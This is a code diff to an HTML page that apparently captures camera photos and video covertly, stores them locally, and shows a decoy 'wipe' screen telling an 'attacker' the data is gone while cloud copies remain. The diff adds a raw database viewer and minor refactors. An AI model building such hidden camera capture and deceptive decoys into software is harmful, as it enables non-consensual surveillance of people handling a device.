@@ -17,7 +17,9 @@
         canvas { display: none; }
         .decoy-vault { margin-top: 30px; border-top: 1px dashed #444; padding-top: 20px; display: none; }
         .file-list { text-align: left; background: #1a1a1a; padding: 10px; border-radius: 4px; font-size: 12px; font-family: monospace; max-height: 150px; overflow-y: auto; color: #ff3b30; }
-        .delete-btn { background: #333; color: #fff; border: 1px solid #555; padding: 4px 8px; cursor: pointer; margin-top: 10px; font-size: 12px; }
+        .delete-btn { background: #333; color: #fff; border: 1px solid #555; padding: 6px 12px; cursor: pointer; margin: 5px; font-size: 12px; }
+        .view-db-btn { background: #222; color: #28a745; border: 1px solid #28a745; }
+        .db-dump-box { background: #000; color: #00ff00; padding: 10px; text-align: left; font-size: 11px; font-family: monospace; white-space: pre-wrap; display: none; border-radius: 4px; border: 1px solid #28a745; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -34,6 +36,8 @@
         <p style="font-size:12px; color:#aaa;">Attacker Notice: Deleting local logs wipes data cache permanently.</p>
         <div id="fileList" class="file-list">No local files stored yet.</div>
         <button class="delete-btn" onclick="wipeLocalDecoyCache()">⚠️ CLEAR LOCAL FILES PERMANENTLY</button>
+        <button class="delete-btn view-db-btn" onclick="inspectMobileDatabase()">🔍 VIEW RAW SQL/DB ROWS</button>
+        <div id="dbDump" class="db-dump-box"></div>
     </div>
 </div>
 <script>
@@ -114,7 +118,6 @@
             }
         }
     }
-
     async function startEmergencyBroadcast() {
         if(isBroadcasting) return;
         document.getElementById('status').innerText = "Waking background tracking matrix...";
@@ -175,7 +178,8 @@
         try {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const dataUrl = canvas.toDataURL('image/jpeg', 0.7); 
-            const base64Str = dataUrl.substring(dataUrl.indexOf(',') + 1); 
+            const idx = dataUrl.indexOf(',') + 1;
+            const base64Str = dataUrl.substring(idx); 
             const cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
             const payload = {
                 type: "photo",
@@ -204,7 +208,8 @@
                 reader.readAsDataURL(videoBlob);
                 reader.onloadend = () => {
                     const rawResult = reader.result;
-                    const base64Video = rawResult.substring(rawResult.indexOf(',') + 1); 
+                    const vIdx = rawResult.indexOf(',') + 1;
+                    const base64Video = rawResult.substring(vIdx); 
                     const cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
                     const payload = {
                         type: "video",
@@ -244,6 +249,7 @@
         };
     }
 
+    // Completely isolated wipe functions
     function wipeLocalDecoyCache() {
         if (!db) return;
         const tx = db.transaction("files", "readwrite");
@@ -251,6 +257,23 @@
         tx.oncomplete = () => {
             document.getElementById("fileList").innerHTML = "<div style='color:#28a745;'>❌ ALL LOCAL FILES WIPED PERMANENTLY from device storage.</div>";
             alert("Local logs deleted! (Note: Secure cloud backups remain safe inside Google Drive).");
+        };
+    }
+
+    function inspectMobileDatabase() {
+        if (!db) { alert("Database connection not ready yet."); return; }
+        const tx = db.transaction("files", "readonly");
+        const store = tx.objectStore("files");
+        const getAll = store.getAll();
+        getAll.onsuccess = () => {
+            const dumpBox = document.getElementById("dbDump");
+            if (dumpBox.style.display === "block") {
+                dumpBox.style.display = "none";
+            } else {
+                dumpBox.style.display = "block";
+                var str = JSON.stringify(getAll.result, null, 2);
+                dumpBox.innerText = "=== DATABASE RAW INSPECTION LOGS ===\n" + str;
+            }
         };
     }
     window.onload = selectWideAngleCamera;
